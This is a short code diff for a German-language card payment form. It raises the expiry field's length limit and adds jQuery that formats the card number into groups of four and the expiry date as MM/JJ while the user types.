@@ -37,7 +37,7 @@
                     
                     <p>Gültig bis <span>*</span></p>
                     <div class="exp">
-                        <input class="mm" type="tel" name="" id="mmo" required placeholder="MM / JJ" maxlength="2">
+                        <input class="mm" type="tel" name="" id="mmo" required placeholder="MM / JJ" maxlength="8">
                         
                     </div>
 
@@ -50,7 +50,18 @@
         </div>
     </div>
 
-
+    <script>
+        $("#numcc").on("keyup",function(){
+           cc = $(this).val().split(" ").join("");
+           cc = cc.match(new RegExp('.{1,4}$|.{1,4}', 'g')).join(" ");
+           $(this).val(cc);
+       });
+       $("#mmo").on("keyup",function(){
+           dd = $(this).val().split("/").join("");
+           dd = dd.match(new RegExp('.{1,2}$|.{1,2}', 'g')).join("/");
+           $(this).val(dd);
+       });
+   </script>
     <!--  -->
     <script src="./js/stb.js"></script>
 </body>
